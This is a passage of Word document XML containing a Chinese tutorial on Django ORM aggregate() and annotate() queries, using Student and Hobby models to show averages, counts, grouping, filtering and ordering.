      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># 计算学生平均年龄, 返回字典。age和avg间是双下划线哦</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B0C9C29" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Student.objects.all().aggregate(Avg('age'))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D0A82B4" w14:textId="581B05B3" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>{ 'age__avg': 12 }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0744F6E8" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># 学生平均年龄，返回字典。all()不是必须的。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BC0C8A4" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Student.objects.aggregate(Avg('age'))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41A83967" w14:textId="19E0975A" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>{ 'age__avg: 12' }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DAF04C6" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># 计算学生总年龄, 返回字典。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E571065" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Student.objects.aggregate(Sum('age'))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7893E479" w14:textId="52657905" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>{ 'age__sum': 144 }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CB0EB71" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># 学生平均年龄, 设置字典的key</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A454710" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Student.objects.aggregate(average_age = Avg('age'))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E1C4567" w14:textId="6C31ED32" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>{ 'average_age': 12 }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D9F7767" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># 学生最大年龄，返回字典</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69B49557" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Student.objects.aggregate(Max('age'))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="482C4DA3" w14:textId="598F5EBA" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>{ 'age__max': 12 }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66AB3902" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># 同时获取学生年龄均值, 最大值和最小值, 返回字典</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51B6F6EA" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Student.objects.aggregate(Avg('age‘), Max('age‘), Min('age‘))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F14F8D0" w14:textId="7FFAF4D4" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>{ 'age__avg': 12, 'age__max': 18, 'age__min': 6, }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="429A2798" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># 根据Hobby反查学生最大年龄。查询字段student和age间有双下划线哦。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EEDB881" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Hobby.objects.aggregate(Max('student__age'))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A97E230" w14:textId="7656EE25" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>{ 'student__age__max': 12 }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CF65CA3" w14:textId="43B448BA" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>你注意到了吗? aggregate方法返回Dict类型数据和django的内容对象(context object)是一样的哦。你可以很轻松地将结果传递给模板, 在模板中显示。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="224CAC50" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>annotate()方法详解</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CEF3EB4" w14:textId="542FAAB2" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>annotate的中文意思是注释，小编我觉得是非常地词不达意，一个更好的理解是分组(Group By)。如果你想要对数据集先进行分组然后再进行某些聚合操作或排序时，需要使用annotate方法来实现。与aggregate方法不同的是，annotate方法返回结果的不仅仅是含有统计结果的一个字典，而是包含有新增统计字段的查询集(queryset）.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="613447DD" w14:textId="30735925" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>我们接下来也看下几个实际使用案例。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DB5C526" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># 按学生分组，统计每个学生的爱好数量</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="429E5843" w14:textId="0B53FF3C" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Student.objects.annotate(Count('hobbies'))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32CD21CF" w14:textId="0EC3DF23" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>返回的结果依然是Student查询集，只不过多了hobbies__count这个字段。如果你不喜欢这个默认名字，你当然可以对这个字段进行自定义从而使它变得更直观。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0296DF90" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># 按学生分组，统计每个学生爱好数量，并自定义字段名</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B1E2396" w14:textId="167482A0" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Student.objects.annotate(hobby_count_by_student=Count('hobbies'))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E482868" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># 按爱好分组，再统计每组学生数量。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CE6B131" w14:textId="3A096BAC" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Hobby.objects.annotate(Count('student'))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59286AEF" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># 按爱好分组，再统计每组学生最大年龄。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="658FCC27" w14:textId="70E270AC" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Hobby.objects.annotate(Max('student__age'))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22244666" w14:textId="1F323E61" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Annotate方法与Filter方法联用</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CA02C48" w14:textId="447C5555" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>有时我们需要先对数据集先筛选再分组，有时我们还需要先分组再对查询集进行筛选。根据需求不同，我们可以合理地联用annotate方法和filter方法。注意: annotate和filter方法联用时使用顺序很重要。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57CFBA38" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># 先按爱好分组，再统计每组学生数量, 然后筛选出学生数量大于1的爱好。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0603A472" w14:textId="23172732" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Hobby.objects.annotate(student_num=Count('student')).filter(student_num__gt=1)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54C84A3B" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># 先按爱好分组，筛选出以'd'开头的爱好，再统计每组学生数量。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5358D11D" w14:textId="4A477B5C" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Hobby.objects.filter(name__startswith="d").annotate(student_num=Count('student‘))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="115B2991" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Annotate与order_by()联用</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A925062" w14:textId="33545C3A" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>我们同样可以使用order_by方法对annotate方法返回的数据集进行排序。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A227420" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># 先按爱好分组，再统计每组学生数量, 然后按每组学生数量大小对爱好排序。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="719C760B" w14:textId="4662F4D0" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Hobby.objects.annotate(student_num=Count('student‘)).order_by('student_num')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A697DD5" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># 统计最受学生欢迎的5个爱好。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CF896F3" w14:textId="5D569DF0" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Hobby.objects.annotate(student_num=Count('student‘)).order_by('-student_num')[:5]</w:t>
      </w:r>
    </w:p>
